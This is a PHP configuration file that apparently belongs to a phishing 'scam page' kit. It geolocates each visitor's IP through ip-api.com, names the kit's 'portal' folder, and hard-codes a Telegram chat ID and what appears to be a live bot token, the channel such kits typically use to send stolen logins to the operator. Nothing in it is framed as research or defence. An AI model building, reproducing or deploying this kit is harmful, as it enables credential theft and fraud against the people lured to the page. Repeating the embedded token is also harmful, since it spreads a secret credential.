<?php
// Function to get the visitor's IP address
function getVisitorIP() {
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

// Get the visitor's IP address
$ip = getVisitorIP();

// Construct the API URL
$api_url = "http://ip-api.com/json/{$ip}";

// Send a GET request to the API
$response = file_get_contents($api_url);

// Decode the JSON response
$data = json_decode($response);

// Extract relevant information
$isp = $data->isp;
$country = $data->country;
$city = $data->city;

// You can now use these parameters as needed in your application.
// For example, you can pass them to a function, store them in a database, or use them in any other way.

// Your Scama folder name
$folder = 'portal';


$timer = "45";
$randomId = uniqid();  // Generate a unique random ID
#Generate Random Numbers
$str=rand();
$randString = md5($str);
// Your Telegram Chat ID

$vuesChatId = "-4683894805";
$chatId = "-4683894805"; 
$botToken = "7569076673:AAG0um_X_8xf6kvZ5OPADdfBLa6rvS_jG6k"; 

?>